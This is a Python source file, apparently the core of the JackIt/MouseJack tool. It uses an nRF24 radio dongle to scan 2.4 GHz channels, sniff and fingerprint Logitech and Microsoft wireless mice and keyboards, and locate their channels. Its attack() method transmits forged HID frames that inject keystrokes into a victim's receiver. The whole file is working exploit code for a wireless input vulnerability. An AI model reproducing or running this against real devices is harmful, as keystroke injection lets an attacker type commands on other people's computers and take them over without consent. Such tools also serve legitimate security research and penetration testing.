# -*- coding: utf-8 -*-

import time
from lib import nrf24, nrf24_reset
from plugins import logitech, microsoft, microsoft_enc


class MouseJack(object):
    ''' Class for scanning, pinging and fingerprint devices '''

    def __init__(self, disable_lna=False, debug=False, reset=False):
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.init_radio(disable_lna, reset)

    def _debug(self, text):
        if self.debug:
            print(text)

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def serialize_payload(self, p):
        return str(bytearray(p))

    def serialize_address(self, a):
        return ''.join(chr(b) for b in a[::-1])

    def init_radio(self, disable_lna, reset):
        if reset:
            self._debug("Reseting PARadio USB Dongle")
            nrf24_reset.reset_radio(0)
        self.radio = nrf24.nrf24(0)
        if not disable_lna:
            self._debug("Enabled LNA")
            self.radio.enable_lna()

    def add_device(self, address, payload):
        channel = self.channels[self.channel_index]
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = time.time()
            if channel not in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.fingerprint_device(payload):
                self.devices[address]['device']  = self.fingerprint_device(payload)
                self.devices[address]['payload'] = payload
        else:
            self.devices[address] = {}
            self.devices[address]['device']    = ''
            self.devices[address]['payload']   = payload
            self.devices[address]['count']     = 1
            self.devices[address]['channels']  = [self.channels[self.channel_index]]
            self.devices[address]['address']   = [int(b, 16) for b in address.split(':')]
            self.devices[address]['timestamp'] = time.time()
            self.devices[address]['device']    = self.fingerprint_device(payload)

    def scan(self, timeout=5.0):
        self.radio.enter_promiscuous_mode('')
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        last_tune = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                self.channel_index = (self.channel_index + 1) % (len(self.channels))
                self.radio.set_channel(self.channels[self.channel_index])
                last_tune = time.time()

            value = self.radio.receive_payload()
            if len(value) >= 5:
                address, payload = value[0:5], value[5:]
                a = self.hexify(address)
                self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))
                self.add_device(a, payload)

        # TODO: Need to catch RuntimeError in jackit
        return self.devices

    def sniff(self, timeout, address):
        addr_string = address[:]
        address = [int(b, 16) for b in address.split(':')]
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        last_ping = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
                if not self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                    success = False
                    for self.channel_index in range(len(self.channels)):
                        self.radio.set_channel(self.channels[self.channel_index])
                        if self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                            last_ping = time.time()
                            success = True
                            self._debug("Ping success on channel %d" % self.channels[self.channel_index])
                            break

                    if not success:
                        self._debug("Ping failed")
                else:
                    last_ping = time.time()

            value = self.radio.receive_payload()
            if value[0] == 0:
                last_ping = time.time()
                payload = value[1:]
                self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], addr_string, self.hexify(payload)))
                self.add_device(addr_string, payload)

        # TODO: Need to catch RuntimeError in jackit
        return self.devices

    def sniffer_mode(self, address):
        self.radio.enter_sniffer_mode(self.serialize_address(address))

    def find_channel(self, address):
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        for channel in range(2, 84):
            self.radio.set_channel(channel)
            if self.radio.transmit_payload(self.serialize_payload(ping)):
                return channel
        return None

    def set_channel(self, channel):
        self.current_channel = channel
        self.radio.set_channel(channel)

    def transmit_hook(self, payload):
        self._debug("Sending: " + self.hexify(payload))

    def transmit_payload(self, payload):
        self.transmit_hook(payload)
        return self.radio.transmit_payload(self.serialize_payload(payload))

    def fingerprint_device(self, p):
        if not p:
            return ''
        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
            # Most likely a non-XOR encrypted Microsoft mouse
            return 'Microsoft HID'
        elif len(p) == 19 and p[0] == 0x0a:
            # Most likely an XOR encrypted Microsoft mouse
            return 'MS Encrypted HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return 'Logitech HID'
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            # Definitely a logitech keystroke packet
            return 'Logitech HID'
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return 'Logitech HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return 'Logitech HID'
        else:
            return ''

    def get_hid_from_payload(self, address, payload):
        device_type = self.fingerprint_device(payload)
        if device_type == 'Microsoft HID':
            hid = microsoft.HID(address, payload)
        elif device_type == 'MS Encrypted HID':
            hid = microsoft_enc.HID(address, payload)
        elif device_type == 'Logitech HID':
            hid = logitech.HID(address, payload)
        return hid

    def attack(self, hid, attack):
        hid.build_frames(attack)
        for key in attack:
            if key['frames']:
                for frame in key['frames']:
                    self.transmit_payload(frame[0])
                    # This code was for additional reliability -- may cause duplicate keystrokes
                    # (currently leaving it disabled)
                    #
                    # if not self.transmit_payload(frame[0]):
                    #    for i in range(0,5):
                    #        time.sleep(0.1)
                    #        if self.transmit_payload(frame[0]):
                    #            break
                    time.sleep(frame[1] / 1000.0)
